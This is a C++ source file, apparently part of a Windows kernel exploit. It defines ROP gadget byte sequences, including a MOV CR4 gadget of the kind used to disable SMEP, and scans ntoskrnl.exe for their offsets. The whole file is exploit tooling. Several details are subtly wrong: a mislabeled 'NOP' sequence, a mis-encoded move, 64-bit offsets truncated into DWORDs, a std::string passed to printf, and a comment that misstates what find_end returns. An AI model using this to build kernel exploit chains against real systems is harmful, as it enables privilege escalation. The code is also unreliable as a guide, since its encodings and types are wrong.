#include "Gadgets.h"
#include <algorithm>

std::map<std::string, std::vector<BYTE >> opcodes = {
	/*
	 TODO: allow multiple sequences for one operation
	 */
	{ "RET" , { 0xC3 }},
	{ "POP_RAX", { 0x58, 0xC3 }},
	{ "POP_RCX", { 0x59, 0xc3 }},
	{ "MOV_CR4_RCX", { 0x0f, 0x22, 0xe1, 0xc3 }},

	{ "NOP", { 0x4d, 0xc3 }},
	{ "POP_RAX_POP_RCX", { 0x58, 0x59, 0xc3 }},
	{ "MOV_RCX_PTRRAX", { 0x48, 0x89, 0x08, 0xc3 }},
	{ "MOV_RAX_PTRRCX", { 0x89, 0x01, 0xc3 }},
	{ "XOR_RAX_RAX", { 0x48, 0x33, 0xc0, 0xc3 }},
	{ "XOR_ESI_ESI", { 0x31, 0xf6, 0xc3 }},
};

std::map<std::string, DWORD> kernelGadgets = {
	// filled by ResolveGadgets
};

void ResolveGadgets() {
	HMODULE lpFileName = LoadLibrary(L"C:\\Windows\\System32\\ntoskrnl.exe");
	for (std::map<std::string, std::vector<BYTE>>::iterator iter = opcodes.begin(); iter != opcodes.end(); ++iter)
	{
		std::string k = iter->first;
		unsigned char *v = (unsigned char*)&iter->second[0];
		QWORD gadgetOffset = FindGadget(lpFileName, v, (SIZE_T)iter->second.size());
		kernelGadgets[k] = gadgetOffset;
		printf("[*] %s is at 0x%lx\n", k, gadgetOffset);
	}
}

// FindGaget searches for a byte sequence in the code section of a module
QWORD FindGadget(HMODULE moduleName, BYTE* opCodeArray, int opCodeSize) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleName;
	PIMAGE_NT_HEADERS ntHeader;
	ntHeader = (PIMAGE_NT_HEADERS)((ULONGLONG)(dosHeader)+(dosHeader->e_lfanew));
	IMAGE_OPTIONAL_HEADER opHeader;
	opHeader = ntHeader->OptionalHeader;

	BYTE* ntoskrnlBuf;
	ntoskrnlBuf = (BYTE*)malloc(opHeader.SizeOfCode);
	SIZE_T sizeRead;
	ReadProcessMemory(GetCurrentProcess(), moduleName, ntoskrnlBuf, opHeader.SizeOfCode, &sizeRead);

	BYTE* buf = ntoskrnlBuf;
	PBYTE bufLast = buf + opHeader.SizeOfCode;
	BYTE* pattern = opCodeArray;
	PBYTE patternLast = pattern + opCodeSize;
	// std::search would search from start, however at start more gadgets are non paged in the kernel
	PBYTE occurence = std::find_end(buf, bufLast, pattern, patternLast); // returns iterator to first occurence of sequence

	BOOL found = (occurence != bufLast);
	printf("%x,%x\n", *occurence, *(occurence + 1));

	if (found)
	{
		return std::distance(buf, occurence);
	}
	else
	{
		return -1;
	}
}


